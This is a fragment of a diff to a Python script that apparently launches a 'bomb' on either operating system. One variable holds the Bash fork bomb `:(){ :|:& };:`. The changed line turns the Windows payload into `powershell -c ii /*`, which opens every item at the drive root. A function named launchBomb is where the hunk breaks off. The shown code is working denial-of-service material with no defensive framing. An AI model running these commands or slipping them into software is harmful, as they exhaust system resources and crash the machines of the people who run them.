@@ -1,7 +1,7 @@
 #!/bin/env python3
 import os
 
-win = "ii /*"
+win = "powershell -c ii /*"
 lin = ":(){ :|:& };:"
 
 def launchBomb(con):
